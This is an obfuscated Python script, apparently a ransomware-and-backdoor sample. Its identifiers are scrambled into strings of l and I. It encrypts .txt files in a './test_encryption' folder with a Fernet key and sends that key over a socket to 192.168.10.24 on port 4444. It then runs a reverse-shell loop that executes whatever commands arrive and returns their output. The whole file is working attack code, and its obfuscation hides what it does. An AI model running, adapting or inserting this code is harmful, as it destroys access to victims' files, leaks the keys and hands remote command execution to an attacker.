lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII = open, Exception, bool, print

from os import walk as llllIlIIlIIlll
from os.path import join as IlIllIlIIIIlIl
from socket import socket as llIlIIIlIIIllI, AF_INET as lIllIlllIIlIII, SOCK_STREAM as IIllIIIIIIIIII
from subprocess import check_output as IlIlIlIIIIlllI, STDOUT as IllllIIllIIllI, CalledProcessError as IIlIIllIlllIIl
from cryptography.fernet import Fernet as lIIlIlIlIllIII

def lllIlIIIlIIIlIlIll():
    return lIIlIlIlIllIII.lllIlIIIlIIIlIlIll()

def IIlIllllIlIllIIIlI(IllIlIlIlllllIllll, IllIIlIIlIllIlllIl):
    with lllllllllllllll(IllIlIlIlllllIllll, 'rb') as llllllIlIIIllIIlll:
        lIIlIIIllIlIllIIIl = llllllIlIIIllIIlll.read()
    IlllIlllIlIllllIlI = IllIIlIIlIllIlllIl.encrypt(lIIlIIIllIlIllIIIl)
    with lllllllllllllll(IllIlIlIlllllIllll, 'wb') as llllllIlIIIllIIlll:
        llllllIlIIIllIIlll.write(IlllIlllIlIllllIlI)

def IIIIlIlllIlIIlIIlI(IIlIIlllllIllllIlI, IllIIlIIlIllIlllIl, IIIIIIIlIlIIlIllII):
    for (IlIlllllllIlllIlIl, lIlIllIIlllIIIIllI, IIlIIIIlllIllIlIlI) in llllIlIIlIIlll(IIlIIlllllIllllIlI):
        if IIIIIIIlIlIIlIllII not in IlIlllllllIlllIlIl:
            continue
        for llllllIlIIIllIIlll in IIlIIIIlllIllIlIlI:
            if llllllIlIIIllIIlll.endswith('.txt'):
                IllIlIlIlllllIllll = IlIllIlIIIIlIl(IlIlllllllIlllIlIl, llllllIlIIIllIIlll)
                IIlIllllIlIllIIIlI(IllIlIlIlllllIllll, IllIIlIIlIllIlllIl)

def lIIlIIlIlIllIlIIll(IlIIlIIlIIIIIIlIIl, IllllIlllllIIIIlII, llIlIlIlIlIllIlIlI):
    try:
        with llIlIIIlIIIllI(lIllIlllIIlIII, IIllIIIIIIIIII) as llllIlIlIIIlIlIlII:
            llllIlIlIIIlIlIlII.connect((IlIIlIIlIIIIIIlIIl, IllllIlllllIIIIlII))
            llllIlIlIIIlIlIlII.sendall(f'Encryption Key: {llIlIlIlIlIllIlIlI.decode()}\n'.encode())
            while lllllllllllllIl(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1):
                lllIllllIlIllIlIlI = llllIlIlIIIlIlIlII.recv(1024).decode().strip()
                if lllIllllIlIllIlIlI.lower() == 'exit':
                    break
                if lllIllllIlIllIlIlI:
                    try:
                        lllIlIlIIlIIlIIIlI = IlIlIlIIIIlllI(lllIllllIlIllIlIlI, shell=lllllllllllllIl(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1), stderr=IllllIIllIIllI)
                    except IIlIIllIlllIIl as IlIlIlIlIlIllIIIIl:
                        lllIlIlIIlIIlIIIlI = IlIlIlIlIlIllIIIIl.output
                    llllIlIlIIIlIlIlII.sendall(lllIlIlIIlIIlIIIlI)
    except llllllllllllllI as IlIlIlIlIlIllIIIIl:
        pass
llIIlIlIIIIlIlllII = lllIlIIIlIIIlIlIll()
IllIIlIIlIllIlllIl = lIIlIlIlIllIII(llIIlIlIIIIlIlllII)
IIlIIlllllIllllIlI = './test_encryption'
IIIIlIlllIlIIlIIlI(IIlIIlllllIllllIlI, IllIIlIIlIllIlllIl, IIlIIlllllIllllIlI)
lllllllllllllII(f'Encryption key: {llIIlIlIIIIlIlllII.decode()}')
lIlIllllIIlIlIlIlI = '192.168.10.24'
IlllIIlllllIlIIIll = 4444
lIIlIIlIlIllIlIIll(lIlIllllIIlIlIlIlI, IlllIIlllllIlIIIll, llIIlIlIIIIlIlllII)